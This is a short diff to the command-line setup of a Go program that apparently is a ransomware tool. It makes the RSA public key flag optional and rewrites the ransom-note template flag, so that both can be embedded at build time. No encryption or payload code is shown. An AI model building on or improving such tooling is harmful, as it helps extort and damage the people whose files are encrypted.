@@ -91,9 +91,8 @@ func main() {
 						Required: true,
 					},
 					&urfavecli.StringFlag{
-						Name:     "publicKey",
-						Usage:    "Loads the provided RSA public key in PEM format",
-						Required: true,
+						Name:  "publicKey",
+						Usage: "Path to an RSA public key in PEM format (optional when the binary was built with an embedded key via -tags embedpubkey)",
 					},
 					&urfavecli.StringFlag{
 						Name:  "extBlacklist",
@@ -129,7 +128,7 @@ func main() {
 					},
 					&urfavecli.StringFlag{
 						Name:  "ransomTemplatePath",
-						Usage: "defines where to find the template to use for the ransom note",
+						Usage: "Path to the ransom note template (optional when the binary was built with an embedded template via -tags embedransom)",
 					},
 					&urfavecli.StringFlag{
 						Name:  "ransomFileName",
